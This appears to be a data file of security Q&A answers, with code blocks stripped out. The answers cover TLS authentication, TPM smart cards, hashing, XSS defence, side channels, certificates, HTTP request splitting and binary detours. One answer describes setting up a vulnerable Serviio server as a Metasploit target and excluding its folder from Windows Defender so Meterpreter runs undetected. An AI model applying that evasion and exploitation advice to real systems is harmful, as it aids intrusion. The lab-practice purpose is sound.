","TL;DR: TLS can in theory be used without private keys. An integral part of TLS is that the client properly authenticates the server in order to detect potential man in the middle attacks. This is commonly done with certificates - and this requires the private key of the certificate on the server site to prove to the client that the server is the owner of the certificate1. But, TLS is flexible and also provides other ways to authenticate the server. There are  which allow authentication by using a pre-shared key between client and server. There are  which allow authentication by password. There are even  which allow you to abandon any kind of in-TLS authentication, i.e. require you to do your own authentication. Thus, TLS might be used without certificates. And since certificates are the only part of TLS which requires a private key this means that TLS can be used without private keys. But, even if no private key is used a similar secret thing might be required on the server: both SRP and PSK based authentication require a secret on the server side which should at most be known to server and client. Apart from this, certificate-less (and thus private-key-less) authentication requires both sides of the connection to support the relevant ciphers with the alternative authentication methods. Since browsers currently only support certificate-based authentication a private key is needed on the server side whenever access by a browser is required - i.e. practically every time in case of web servers. For example you can use openssl to provide a TLS protected connection which does not require certificates. The server would look for example like this: {code-blk}. 1 Private keys can not only be required for authentication but also for key exchange, i.e. RSA key exchange. But, RSA key exchange requires certificates so it again means that private keys are only relevant if certificates are used. Also, the Diffie-Hellman key exchange does not need certificates and this is actually the recommended method today since it provides forward secrecy.",60,444,1,True

","You can generate a virtual smart card on a Trusted Platform Module (TPM). A TPM is like a Hardware Security Module (HSM), except that a TPM is physically attached to a computer's motherboard and thus isn't portable. Lots of motherboards have TPMs on them, it's just that a lot of people don't know it and therefore don't often use their TPM.  The main advantage of a TPM is probably its lower cost, relative to HSMs.  A TPM is even more affordable than smart cards, which have to be provisioned to every user and replaced whenever lost.  Another advantage of a TPM, relative to smart cards, is that its non-portability makes it unlikely to be misplaced. About VSC's:  A Virtual Smart Card (VSC) lives on the TPM and stores the private key of a certificate.  The VSC is capable of being protected by a PIN, and the PIN can be set to a minimum level of complexity depending on how you created the VSC. Here are some instructions to get you started (note: Windows is required): Check to see if your TPM is active: Click on the Windows icon, then type the following command, right-click on the icon and execute it as an administrator: {code-blk}, click on the Save button. In PuTTYWinCrypt, try connecting now via SSH.  If you configured everything properly, you should get a pop-up from the Virtual Smart Card on your TPM, asking for your PIN.  Input the PIN.  If the PIN is accurate, the SSH connection should continue and connect as expected. You're done!  You just connected to your server over SSH with a private key that is safely stored on your TPM. The above information was inspired by, and partially obtained from, an informative  by Chris van Marle.

You should only have to use multi/handler for exploits launched outside of Metasploit, but it's not clear if you're doing that or not. I searched around, found, and tested a vulnerable application that you can use to practice with in Windows 10. I don't know what the rules are for posting links for vulnerable software, so I'll just kind of direct you: Serviio Media Server has a command execution vulnerability in some of its older versions. Info on the Metasploit module is located . I tested this with 1.7.1, so go to  and copy the link for the Windows version and change current version they're serving up (1.9.1) to 1.7.1 (literally just change the 9 to a 7). Install Serviio Media Server on your Windows 10 box. I would recommend temporarily whitelisting the Drive:\Program Files\Serviio\bin directory in Windows Defender because it will catch Meterpreter.

","I started by renaming some variables to make things a bit more understandable: {code-blk} Which does look a lot like the calculations that are being done in our code. But why does this show up in Skype without me doing anything? Because browsers and Javascript are literally everywhere. I just started Skype and it didn't give me an error, but it's showing me ads. My gut tells me the embedded browser that loads the ad has no handler for data URL's in your case, which is why Skype appears to give that error. The code is really just adding an eventhandler, and making sure FPS isn't broken every time the event is called. (Switching between ads, make ads run smoothly, make loading icon run smoothly,...) If ads exceed or go below their display time on 1 000 000, 30-second impressions, a 10 ms difference can scale incredibly fast and thus give your advertisers less or more displaytime than they pay for. But why is it obscure? As per @dandavis comment, there indeed is no appearant reason to obfuscate this code, it's available freely on the internet (like i linked above). However, the same embedded browser that is executing this code, might as well host a login frame for example. We're not going to rewrite a handler for both obscure and non-obscure code when it's much easier and less bug prone to just run all code through an obfuscator if we need it once.

","MongoDB does not store passwords in plaintext.  As of MongoDB 3.0, Salted Challenge Response Authentication Mechanism (SCRAM) is the default authentication mechanism for MongoDB.  Scram supports both SCRAM-SHA-1 and SCRAM-SHA-256 hashing mechanisms. Having said that, when interfacing with a database via driver, these often accept a hashed password so that it is not transmitted to and from the database in plaintext form.  This imposes additional responsibility on the developer because he/she has to perform the hashing at their end using the same algorithm as is employed within the DB server.  Luckily, these are readily available for just about any programming language.

This is due to a fundamental issue if hashing. Which is the possibility of hash collisions. Let's say I'm an attacker (Eve). Alice wants to talk to Bob, so Signal sends her public key to Bob, but Eve intercepts the public key and substitutes her own. Normally there is an indication the key changed, and the Safety Number changes. IF Eve had enough resources she could construct a public key which matched the safety number. To combat this threat we make it so that Eve would need to find a collision which occurs after 5200 rounds of hashing, with adding that same key every round. This becomes computationally infeasible since each round of hashing makes finding a collision linearly more computationally expensive. The number of iterations currently picked usually is calculated on how long an attack of this style would take based in resources of the percieved threat.

On the other hand, the time on the signature can't be trusted as you can fabricate it. You would have to provably publish the signature somewhere.

","No, you don't increase entropy by hashing it once, or twice, or ten times. Consider entropy as it is seem from the input, not the output. You cannot add entropy using a deterministic process, as the entropy of the result does not count. Even if you have some code like this: {code-blk} is the top worst password on almost every single list. If a random password is hashed with md5 will the output provide a 128 bit entropy? No, MD5 is deterministic, so if the attacker knows the string is a MD5 hash, the entropy of it is the entropy of the random password you supplied. To make the password more secure, use a proper key derivation ( is a good one), ask the user for a longer password, and check if the user is following basic password rules (no chars repeated in a row, proper length, mixed digits and chars, mixed case, things like that).",132,246,1,True

","Most interesting question. In theory, such an attack would be possible if we were to make CAS (compare-and-swap) intentionally always fail. For that to happen (from a hardware perspective), the underlying hardware should allow all competing threads to fail, which it normally should not, because a CAS that could fail for all threads could lead to live-lock situations (and non-deterministic behavior). Furthermore, techniques such as exponential back-off (like in the case of the Ethernet protocol) should be used before retrying CAS. From a software perspective, if not sure of the hardware behind, one can make sure to use things such AtomicX.compareAndSet (JAVA SE 7,8) instead of AtomicX.weakCompareAndSet, which practically makes sure simultaneous fails of all threads is excluded. As example, win32 implementation is safe: {code-blk} The above is loop free because if the test fails for one thread, it means it must have succeeded for another.",158,228,1,True

","But how can I assume that an intruder can exploit the password weakness (if that even is a threat to me) if I don't even know yet whether weak passwords are allowed (that would be the vulnerability, right? but what if the system is enforcing a very strict and secure password policy or is even disallowing password authentication (only priv/pub key authentication is allowed). Yes, weak passwords are a vulnerability. Before you can do a risk assessment you need to find out about your vulnerabilities. One way to go about understanding your vulnerabilities as well as threats would be to have the system undergo penetration testing. This will involve use of penetration tools and scripts that will attempt to exploit vulnerable libraries or insecure programming. But to make the most of a penetration tester, you will want to give them as much information as possible including the application source code. If the tester only needs to make use of basic penetration tools to break into your system, you now know a script-kiddie could compromise your system - that's a pretty high threat. On the other hand if the tester has to devise custom script/program then, while still a threat, it is less likely to happen. Once you have a much better idea of your vulnerabilities and type of threats who can exploit those vulnerabilities you can do a risk assessment of each weakness. Risk assessments can help prioritize what to fix first.

","DHT nodes randomly generates node ID by themselves. {code-blk}. It is unlikely that one node has the same Node ID as the other node. Even if a malicious node impersonates another node, nothing will happen. That node continues to function as usual without facing denial of service. Other nodes will continue to query that node for lookup search as that node has stayed longer in DHT than a malicious node and is known to other nodes. Whereas the malicious node has to propagate his presence in DHT which can take some time. The situation will look something like same node ID but with two different routing tables. Some new nodes will query that malicious node as they discover him and he may return false responses but as the data in DHT is replicated very quickly, even if a single node is acting malicious that doesn't affect other nodes in DHT. Instead a threat actor signs up thousands of random nodes in DHT to propagate false information. This is called Sybil attack. Cloning node ID is not really a problem because nodes die very quickly. By the time a malicious node will propagate his presence, the victim is probably gone offline and come back with new node ID.

","No, this is not enough. An attacker does not necessarily need to call an external script. They can dump the payload directly into the inline script too. Depending on the length restrictions in place, this can become quite tricky, but still manageable. The main takeaway from this is that custom-made solutions are not very secure. Every now and then I see people trying to ask if their new ingenious solution just stopped all XSS, CSRF, SQL Injections, etc... The answer to all of these questions is no. XSS Protection is a problem that has been solved already, with proper output encoding and additionally possible input validation. This means that every output needs to be encoded for its intended destination. Don't do this yourself either, but use a framework or library which provides this for you. Input validation verifies if input is in the expected format. For example, if you expect an email address, RFC-822 offers a very large regex, which is guaranteed to validate all standard-conform email addresses. Is this overkill and unnecessary? Probably. But for simpler things like numbers, you can implement input validation in addition to output encoding: {code-blk} This example code would allow all integers without zero-prefixes. Any other input will be rejected. Summary Never use your own custom method to implement security! This is the golden rule of security and breaking it will get you hacked. Use output encoding for the target context! If untrusted data is written into the DOM, then encode it for the DOM. If it's written for an attribute value, then encode it as attribute value. Encoding is the only way to be sure. Optionally use input validation alongside output encoding! By ensuring that input is what you expect it to be, you can save yourself multiple headaches down the line.",62,410,1,True

That said; yes encryption is still applied. Even with bogus certificate, you still get protection from passive evesdropping. However, in principle, some network devices can detect self-signed certs and perform SSL MITM in what looks like totally passive fashion, invisible until you start verifying byte-to-byte exact matches of fingerprints.

","The same as using plaintext (unencrypted and unauthenticated) communication elsewhere. What exactly that means, depends on your threat model. Smart Bulb, Dumb Protocol Imagine you had a smart lightbulb in your home. You could use an app to control the brightness and the warmth of the bulb. It even offers an API, so you can control it via a Raspberry Pi too, if you wanted. Sadly, the bulb doesn't offer HTTPS, so all your communication is in clear text. It may sound terrible, but it's probably fine. Why? Because in order for an attacker to do something about it, they'd need to be in the same network as you. And if the attacker is already in your home network, then you probably have more problems than a dumb smart bulb. But what could an attacker do? For once, an attacker can read what you send to the bulb, and what the bulb sends in return. This is most likely something like: {code-blk} All in all, very boring data. Yes, technically, your confidentiality was violated, but in this scenario, that's not very problematic. The attacker knows your bulb is set to 73% brightness. Of course, an active attacker could do more. They could modify what you send to the device, and also what the device returns. Depending on what you do with the data, this might be dangerous. How can I protect myself? You can't. Well, technically you can, but it requires some fiddling. Okay, a lot of fiddling. If an IoT device does some task like sending e-mails, but doesn't encrypt them, you can at least use a proxy to remove any sensitive information before an e-mail is sent. It's a lot of work, and will give you very little benefit. It's easier to just forbid communication with the outside world, if this is possible. How can developers fix this mess? Developers can use ciphers specifically designed to require low power consumption and low memory requirements. Yes, it'll make the product more complex to design, and it will make the end result more expensive, but it's more secure than the alternative.",92,482,2,True

","The password is never sent. It is hashed, and that hash is used (indirectly) for encryption. The password can be passed through an algorithm called -HMAC-SHA1 with 256-bit output and a salt derived from the ESSID (network name) to generate the PSK, a raw 256-bit key. This PSK is used to authenticate a handshake, called the , between the client and the router where a random, per-session data encryption key is derived. The reason Windows does not store the raw PSK rather than the password is for better user experience. If someone doesn't know their password when adding a new device to the network, they can view it on Windows without needing to connect to the router's administrative panel. Storing passwords in an irreversible format is  where there exists a risk that a database of passwords will be stolen en masse. For a mere personal Wi-Fi password, this risk is far less pronounced. Please note that this only applies to WPA2-PSK. There are other Wi-Fi encryption standards, even under the WPA2 label, which do not use any kind of pre-shared password, such as WPA2-EAP, which can negotiate a key on the fly. To demonstrate that this is possible, this can be done on Linux with The line which was commented out containing the original passphrase has been removed. It's important to be aware that this PSK, if stolen, will give the attacker the same capabilities as if they stole the original password. They will be able to decrypt stored sessions and authenticate to your access point. However, they will not know the original password itself, which may be useful if it is used elsewhere (a bad idea).",96,391,1,True

","Don't roll your own crypto! This is the golden rule of cryptography. If you do, your application will crash and burn, and all the hackers will laugh at you. It has been done time and time again, with companies boasting about how their ""custom encryption algorithm"" is perfectly safe, because it's closed source and no hacker could ever figure out how it works. Turns out that it had huge glaring issues and exploiting it was trivial, every single time. Even expert cryptographers, who spent decades studying how to make good cryptographic algorithms, consider it extremely difficult to make an algorithm that is safe against all kinds of attacks. But what should we do now? That depends entirely on what your API actually does, and what you use these parameters for. What JSON Web Tokens do is ""representing claims securely between two parties"". If this is what your API needs, then you should absolutely go for JWT. Basically, once the user has authenticated themselves to your API, the API can then generate a JWT and send it to the user, which they can use to authorize themselves on every subsequent claim. But can't an attacker just copy my token and thus steal my authorization? Yes, if you used plaintext communication.

","To do this, you're gonna need to do some learning, I'm afraid. Googling ""how to do field encryption in a database?"" will probably get you started. In essence, you're gonna need to do the encryption (probably AES-GCM-256 encryption) in your application layer. Data comes in, application uses the AES key to encrypt it, and stick the encrypted blob in the database. When you retrieve a field from the database, the application uses the AES key to decrypt it and then use it. Once you have that infrastructure in place, using a different AES key based on the ID number of the record should be easy. The problem you're going to run into is how you securely store the AES keys. You can't put them in the database, because storing the decryption key next to the encrypted data is a big no-no. So do you just put the key in a flat file on disk of the application server? Do you use some obfuscation trick to obscure the key on disk? Do you buy a server with a good TPM on the motherboard, and write vendor-specific code to store your keys on the TPM? Do you buy a full HSM? These are tricky issues that don't have a good universal solution. If you're going to design and build such a system, you should become familiar with the tricky parts, and design a solution that fits what you have available.

","Side-Channel attacks are notoriously difficult to detect, because there are many side-channels that an attacker could look for. This includes, but is not limited to: Timing Attacks Cache Attacks Power-Monitoring Attacks Acoustic Cryptanalysis has an excellent list, from which this is just an excerpt. Since there are so many different side-channels, each one of them needs to be addressed independently. What about timing attacks? Your code is vulnerable to timing attacks, but you already knew that. The question is, how can you fix it? The solution would be to make a constant-time comparison. One example would be code like this: {code-blk} are the same length, e.g. because they are the output of a hash function. The code would accumulate the bit difference between each pair of elements, then returns a result based if the differences are zero.  Also beware that your friendly optimizing C compiler is at liberty to spot what this is doing and generate the assembly it would have generated for your original (broken) code.  You need to check the actual generate assembler (or use a library function designed for this). Of course, this would only protect against one kind of side-channel attack, and not others. What about the other side-channels? That depends entirely on the side-channel you are focusing on. Some, such as power consumption, require physical access (or other ways to measure consumption), so they may not be a problem if the attacker is far away. In general, in order to defend against side-channel attacks you need to: Be aware that the side-channel exists Check if this side-channel could be a potential problem in your threat model Check what information is leaked via this side channel Check how to prevent leaking this information",61,393,2,True

Shellcodes are normally written in hex and then when executed, they get decoded. They're not written like that for any of the reasons you mentioned though.

Consider this form, pretending that javascript takes over the form submission and sends data securely: {code-blk} connection can still result in credentials being sent in the clear.  To completely avoid the risk of that you would have to do one (or more) of the following things: Serve the page over HTTPS Specify an action Remove the name from the input elements (the browser will no longer include them in the form data) As for whether or not this is a false positive, it is quite possible, but I'm having a hard time coming up with a comprehensive answer based on your description.

","Everything I understand about password security and hashing tells me this is not only a stupid design, but actually undermines the hash algorithm and lowers security. Special Publication 800-63B on Digital Identity Guidelines suggests passwords need not be long and complex but rather has the following to say about passwords: A minimum of eight characters and a maximum length of at least 64 characters The ability to use all special characters but no special requirement to use them Restrict sequential and repetitive characters (e.g. 12345 or aaaaaa) Restrict context specific passwords (e.g. the name of the site, etc.) Restrict commonly used passwords (e.g. p@ssw0rd, etc.) and dictionary words Restrict passwords obtained from previous breach corpuses I would say that rfc3414 does not inhibit these guidelines and an implementation could provide additional guidelines for password generation. Section 11.2 seems to plead for implementers to encourage good passwords. It should also be noted that the wording in 11.2 seems to indicate the algorithm is an example, and not the requirement. Is there actually a benefit to this method of key generation? In section 2.6 a key localization technique is described The example in the appendix has the additional (third) argument of engineID which is specific to the authoritative SNMP engine. {code-blk}",120,305,1,True

","A Web Server handles certificates and TLS connections A web site itself is simply an HTML document, possibly including scripts and stylesheets, and references to other resources (external scripts, styles, images, etc.). The document itself is not aware if it is served via HTTP or HTTPS, and if so, which certificate was used for that. Instead, these things are handled by the web server. A web server, such as nginx, can be given a certificate and the private key associated with the certificate. If configured to server HTTPS, then the web server will use said certificate in any incoming TLS connection. Regarding Multiple Certificates You seem to confuse ""web site"" for ""web server"", in regards to nginx. A web site is one document, where as a ""web server"" is one logical unit for nginx, with its own configuration and, more importantly, host name. As such, nginx can be configured as follows: {code-blk} If the web server was reached with the hostname server1.example.org, it would serve the certificate found in cert1.pem. Likewise, if it was reached as server2.example.org, it would server the certificate from cert2.pem. Regarding Web Applications Likewise, a ""web application"" is just a fancy name for a document with some server-side logic behind. But this also does not handle any certificates or TLS connections. In fact, it would make a web application a lot less portable if it did so, because any change in certificate would require changes to the codebase. This split was done intentionally, as it separates two different tasks. The task of the web server is to accept incoming connections, parse HTTP requests, handle TLS connections, etc.. Once all of this is done, the web server forwards the parsed requests to the web application, which then handles all the application logic.",100,427,3,True

","Previous versions of openssl used a very weak key derivation process to derive an encryption key from the password.  Version 1.1.1 of openssl now supports key derivation using PBKDF2 with a randomly generated salt, and multiple iterations (10,000 by default) of sha256 hashing. This answer is based on openssl version 1.1.1, using PBKDF2 with a randomly generated salt and 10,000 iterations of sha256 to derive a key (and iv) from the password. First, use openssl to encrypt some plaintext, using the key derivation process described above: {code-blk} For what it's worth, the iv is generated by the PBKDF2 function, as well as the key.  The PBKDF2 function generates 48 bytes.  Bytes 0-31 are the key.  Bytes 32-47 are the iv.  For more information, see .",298,220,1,True

We don't know if that's true, or why he's suggesting this. However he says his current Solr version is 7.7.2. That's not the latest version, according to , and several sources report that 7.7.2 is vulnerable to RCE: see  and , for example. It might also be vulnerable to  (another RCE), but that's not clear to me, among other things that are also not clear (for example why the hell the 7.7.x branch was fixed so late, with version 7.7.3 released on April 28th 2020, while the vulnerability was reported in the summer of 2019). Anyway, why is that guy running an outdated Solr version? He also said that ""his current build-deb was taken from the master"". So I took a look at the code, and there's a bash script named build-deb. Here's interesting piece of that script: {code-blk} Basically, the current master branch has a script that is used to build a deb file for installation, but some dependencies are actually embedded in the deb file (instead of letting the system take care of them, and use the latest releases from the OS repositories).

","There are a few things to unpack there, so I'll start with the following points: Port 443 is usually used for encrypted HTTP (HTTPS) connections. It does not have to be. Web servers can be configured to listen for incoming connections on any port, HTTP messages will be transmitted and received just fine, and the TLS/SSL handshake will complete just fine. 443 is of course the standard though and used the majority of the time. TLS/SSL is separate from HTTP. It just so happens it's really useful and widely used ""on top of"" HTTP. TLS/SSL is also used for video chats, messaging, secure FTP connections, etc. Simply, it's a method of securing communications. HTTP is just the most common type of communication secured. Some of the details of the TLS handshake and how it's established a browsing session will use HTTPS instead of HTTP is explained will in  and .

One minor quibble is that it's not necessarily the DN that's being verified; nowadays the important information is usually carried in the SubjectAlternativeName field(s). Often a CA will only require the CSR to contain a public key and signature, and any other metadata in the CSR is ignored and taken instead from your account info. Also, to elaborate on your 2., the CSR format is specified in  and does indeed include a mandatory signature field. Any CA worth their salt should validate an incoming CSR by checking that the signature validates under the public key contained in the CSR and reject the CSR if it does not. {code-blk} field and have a syntactically-valid CSR, but anyone trying to process the CSR should reject it because it has a broken signature. Can I create a certificate for this CSR if I am the CA and I ignore to validate the private key ownership? If you're the CA you can do whatever you like. You don't even need a CSR; if you have access to the CA private key then you can create certificates containing data you want by producing the X.509 ToBeSigned (TBS) structure in a hex editor, signing it, and stuffing the TBS structure and signature bytes into the right place in an X.509 object. Can the above be trivially demonstrated using openssl commands which are available or does it need tweaks and custom tools? This I would need to go away and play with, which I don't have time for right now. The core question is whether openssl has a setting to disable CSR Proof-of-Possession (PoP) checks when issuing a cert from a CSR.

Detecting an attacker that has rooted your system is very difficult, since the root user can generally do anything it wants, including tampering with logs or modifying security software and configuration. Rooting is a very broad term and can encompass many things. An attacker who rooted a system may use hooking to hide his presence. Hooking is a specific technique that is often used in hacking (although also has a place in debugging). It usually entails replacing a target function with a ""dummy"" function that acts as a wrapper and contains code that evaluates or modifies arguments before passing them on to the ""original"" function, or even replaces the original function in its entirety.

","Compiler options can influence the security of the resulting program in several different ways. Generally speaking, optimization can hurt security. However, this is not a reason to always turn off optimizations! For example, if your encryption code is so slow that users disable the encryption feature and send data around in cleartext, that makes security worse. Undefined behavior Low-level languages such as C and C++ have a lot of areas with . ""Undefined behavior"" means that anything can happen, and compilers take advantage of this to optimize code. There a strong disconnect between the way typical developers see code and the way compilers see code. Often, what looks like an obvious optimization to a developer is hard for a compiler to detect, while compilers may perform optimizations that seem to the developer like it's exploiting a loophole. A classic example is that optimizing compilers will eliminate redundant checks. Sounds good, right? {code-blk} is a good compromise between performance and risk. Safety features Some safety features are partly under the control of the compiler. There, the obvious thing to look for is whether these safety features are enabled. These safety features generally don't help to defend against vulnerabilities, but they can make exploits harder. They often don't make exploits completely impossible, but they can make a difference between taking 5 minutes and 5 weeks to craft an exploit, and that can give the developer the time to develop and deploy a patch. For example, many compilers can generate . Stack canaries detect when a buffer overflow happens on the stack and halt the program. To exploit a stack buffer overflow, the attacker needs to limit the size of the overflow so that the canary isn't overwritten or arrange for the correct value to be written in the canary's place, neither of which are always possible or easy.",94,403,1,True

","Let's see what are the usages of Splitting attacks. But first thing to remember is that the final target is not the attacker, but HTTP agents between the attacker and the backend having the splitting issue. And one other detail, all this works using HTTP Pipelining (where you can send several requests without waiting for individual responses). One of the first usage is security filter bypass. You send 2 requests, but the splitting occurs on the first one and the backend respond with 3 responses. The second one is the new one, it's based on a query that the first did not saw (let's say the  ssl terminator or a reverse proxy cache, or any http load balancer). or this agent there were request 1 and request 2, and when receiving back 3 responses it will usually discard the 3rd response. Then content of response 2 comes from a hidden request (like a request which was hidden in the 1st request body, and only 'discovered' by the backend -- because there's an HTTP splitting issue exploited on this backend). The very fact that this request was hidden prevents the first agent from applying any security rule on this request (let's say this Load balancer should prevent access to {code-blk} content will be replaced by the script content instead of the home page in the Reverse Proxy Cache). Third classical usage is quite hard to implement, but it works with incomplete responses or incomplete queries. With responses or queries from other users completing the incomplete responses or requests. That's usually more a thing with request splitting than response splitting. But the main idea is to get a request or response with elements coming from other users (in the case of request you could get the cookie or bearer tokens of other users added to your headers, in case of response this is more about the page content). You can get more detail on this type of attacks on all HTTP smuggling papers. I can think of another bad usage, the complete mix-up of all requests and responses. On my first example I've been nice saying that the 3rd response was discarded. Some bad HTTP agents could also become completely crazy when the counter of requests and responses are bad. And they could start sending wrong responses to everyone.",104,489,2,True

For each recipient, the DEK is then encrypted with the pubic key of the recipient. The public key, used to encrypt the DEK, is sometimes called the ""Key Encryption Key"", or KEK for short. So, for a message sent to two recipients will look like this: {code-blk} The recipient will then see this message, and attempt to decrypt the first key container with every private key they have available. If decryption fails for all of them, they move on to the second container, then the third, and so on, until one of two things happens: Every key container has been attempted and none could be decrypted.

Being allowed to sign certificates is one of the possible ""authorizations"". In practice, the owner of the private key can sign whatever he wants with it. However, compliant web browsers would reject signatures that are cryptographically valid but do not match the purposes of the certificate. Root and intermediate CAs therefore have fields that indicate they are allowed to sign SSL certificates. The fields . For example, these extensions would ensure the certificate can sign other certs: {code-blk}. Therefore, it is possible for example that, the day you create the root certificate, you impose that no intermediate CA can be derived from the root by setting the pathlen to zero.

","Background Lets start from the top here. Your server receives a request: Hi server, Can you do X for me? - Jane Access Control is when the server checks to see that Jane is actually allowed to do X before processing the request. Generally speaking, all apps will have some endpoints that need an access control check -- maybe Jane is not allowed to delete records from the DB, or maybe Jane is not allowed to change settings of Bob's account, etc. OWASP's point is that in an old-school app, when the user logs in, you might build a session info object telling you who the user is and what permissions they have, and keep that in server memory until the user logs out. Obviously that does not scale with modern cloud architectures. JWT To The Rescue! The key part of that OWASP quote is (emphasis mine) user authentication should be centralised in a Identity Provider (IdP), which issues access tokens Take anything that your microservices need to know about the user (ie anything that you would traditionally have put in the sessionInfo object) and stuff it in a JWT, hand it to the user, and have them hand it back with each REST call. Omitting the crypto parts of a JWT, the claims you care about might be: {code-blk} every 15 mins / 1 hr / 24 hrs is usually a reasonable security-performance tradeoff. In some simple cases you may not have any meta-data and you just want to check that a request is coming from another authorized component; basically a ""Are you me?"" check.

","tl;dr–  As quick-thoughts, you might generate a portfolio of hashes (instead of a single hash) for each fingerprint, such that you can check the contents of two different portfolios for overlap.  Alternatively, homomorphic encryption. I guess you could go in two directions: Use a portfolio of hashes.Generate a set of approximately-equal fingerprints, then hash each of them separately.  Store all of the hashes in a portfolio; compare hashes in two portfolios to assess potential similarities. Use homomorphic encryption.Do normal fingerprint-comparison stuff, but using homomorphic encryption. Option 1: Portfolio of hashes. The basic idea is to: Round your fingerprints to a local approximation. Generate a portfolio that includes the local-approximation plus all close-enough-to-be-matching points. Hash each item in the portfolio separately. For example, say you want to store a date (like someone's birth-date) and you want to hash it, but you want to be able to assess if another date is close after hashing.  Then: Round the date its nearest coarse-grain approximation. For example, if you approximate dates within 3 months and someone was born 2021-08-07, then round that to 2021-09-01. Generate a set of points about that rounded-value in each direction. For example, if someone was rounded to 2021-09-01, then generate points for { {code-blk} Conceptually, the fundamental problem is that cryptographic-hashes intentionally remove the ability to compare if two values are close, but we can still calculate the set of nearby points before hashing. Then each fingerprint-hash encodes one local approximation that'd be considered a match.",87,424,1,True

","Now I'm generating fake certificate for some domain that owns someone else and sign it with my private key from that pair. The detail you're missing is that certificates contain fields that restrict the types of operations that a certificate can be used for. The CA will not provide you with a certificate that can be used to sign other certificates. As an example, here's what the server certificate for this website shows: {code-blk} This again is a CA certificate, but without the path length constraint, meaning that it can be used to sign intermediate CA certificates as well as End Entity certificates. Unlike the intermediary CA key, the root CA key is disallowed from directly creating digital signatures - it can only be used for certificate and CRL signing. This is to prevent abuse of the CA cert if it is compromised. Finally, you can see that the enhanced key usage allows the CA certificate to be used to sign certificates for a variety of purposes other than just client and server authentication. This allows the root CA to generate intermediate CA certificates for things like authenticode and email signing, separate to certificates intended for HTTPS. The client can look at the chain and validate these usage constraints. If you got an End Entity certificate issued by a trusted CA, then manually took the key and used it to sign another End Entity certificate for a different website, the client would see that the chain includes an End Entity certificate, without Certificate Signing usage, somehow signing another End Entity certificate. It would reject that chain.",222,327,1,True

","In general, field level ""blind searches"" (documented on Medium and elsewhere) are a strong, reasonable posture. For a search index as a sample of a datastore: Index: Run appropriate field Analyzers for the data in question (e.g., Snowball Analyzer, etc - remove vowels and duplicate letters for names for example). Hash the result from the Analyzer (slow hashes improve security). a. Use random salts associated with the records - encrypt salts. Store the hash as Hex as String in the index (hashes are one-way). Encrypt the field data and/or group it up and assign a ""Cipher-Reference-ID"" to it.

A Rainbow Attack against the entire data set is arguably impossible since the hashes are salted and the salt repository is separate and secured (not accessible at-rest).

","Foreword It should be noted that this process is what I'd consider overkill for the average person hoping to protect perhaps some private files that wouldn't have life-long effects on their livelihood. The below explanation is more so to elaborate on the answer to the question of what's possible and makes no means to make any claims as to what's realistic. Yes, it's possible. In fact, it would be the next level of security and steps you would take to secure a system containing highly sensitive or classified information. That is, if you really wanted to go the extra mile and hide it, you can. However, as others have mentioned, it's definitely overkill if it's just some private photos you are worried about, but if you had something more valuable to protect then it is possible to ""hide"" this by essentially putting it elsewhere. Physically hiding by keeping it separate Also known as using a Detached Header for your LUKS device, you can remove the header and keep it separate from the system so that without it, there wouldn't seem to be a system to even boot because the separated header can act like a key whereas you would need the header file to supply the information needed by the system to identify the drive as an encrypted drive and provide the means to unlock the partition. Without it, a bad actor would only be able to destroy the data but not access it. Since we're being cautious, you can take it a step further and also keep the boot partition on the same USB drive so that it also holds the kernel image and initramfs images files with the root partition's LUKS header file (keeping the boot partition and header fil in separate partition. That should address your concern as all that's left is encrypted data. There are a number of online tutorials on how to accomplish this but an informational overview of the different methodologies and deeper understanding can be found here: And further reference at  for cryptsetup regarding the header: {code-blk} For a more thorough walkthrough for anyone coming across this answer and may want a deeper understanding of all the commands, try:",80,466,1,True

","Whether it's overkill or not depends on your use cases and your risk assessment.  It sounds like you're describing Role-based Access Control (RBAC).  RBAC is a popular method to help enable segregation of duties and regulatory compliance. Access control based on user roles (i.e., a collection of access authorizations a user receives based on an explicit or implicit assumption of a given role). Role permissions may be inherited through a role hierarchy and typically reflect the permissions needed to perform defined functions within an organization. A given role may apply to a single individual or to several individuals. I'm assuming you mean ""doable with groups in sudo"".  The short answer is yes but you need to be very careful how it's implemented.  With {code-blk} is one method for granting role-based access but you need to be conscious that you could be providing more access than you intended. References",189,211,1,True

I have already asked this question here, but for winlogon and csrss process: I was able to find out that RWX VADs in csrss.exe processes are heaps. Unforunately I can't confirm this for the VADs in winlogon.exe. But I've read an article ""Integrity verification of user space code"" in the Digital Investigations journal, where there is some information about these RWX VADs. The article can be found here: In this article Andrew White and his colleagues make the following statement: Aside from the default executable sections, Windows XP also exhibits some default behaviour in two system pro- cesses that create unverifiable allocations. The first process is winlogon.exe, in which 9 executable and writable allocations are created that appear to onlycontain data. Each of these allocations are 4 pages long, and are sparsely populated. The locations of these allocations can be found in an array within the .data section of winlogon.exe, typically starting at winlogon.exe + 0x72b0c. Unforunately I can't confirm this. Which I assume is due to me using Windows XP SP2 while they use XP SP3. Which probably results in a change of this address.

","I've seen references on Stack Exchange and elsewhere to inserting detours into compiled code. My understanding is that essentially a jmp instruction is inserted and then somehow the patched program is linked with additional code that contains the target of the jmp. As a concrete but (hopefully) simple example, consider a program. {code-blk} The output of the patched program should be: Hello detoured world! How would I do that? How would I avoid breaking address offsets in the compiled code? My available compilers are gcc, clang, and icc. My available operating systems are OS X and Ubuntu. Choose whatever you prefer in your answer. If this can't reasonably be answered here then a brief overview and a pointer to some reading material would also be a good answer. I'm aware of LD_PRELOAD and ld --wrap. The example was chosen so that those methods do not easily suffice. (You could of course just detour the entire hello() function to one that prints ""Hello detoured world!"" but lets pretend you don't have the source code and the function is non-trivial.) Related Questions I was first going to ask how to simply disassemble and reassemble a compiled program but that has been asked. The response was that it's extremely difficult. My sense from the answers is that it's not a common thing to do. I suspect my assumption that disassembling and reassembling is a necessary step for detouring might not be correct. A similar question on StackOverflow received a lukewarm response. This question is focused just on inserting a detour rather than ""modification"" in general and I think the audience here will be more receptive. This Reverse Engineering question asks about modifying binaries in general. A lot of different tools and LD_PRELOAD are mentioned. Some answers say it's possible to do this with a hex editor. I think that's the method I'd be most interested in. Recent examples I have seen that refer to doing such a thing A blog post. This Stack Overflow question.",87,494,1,True

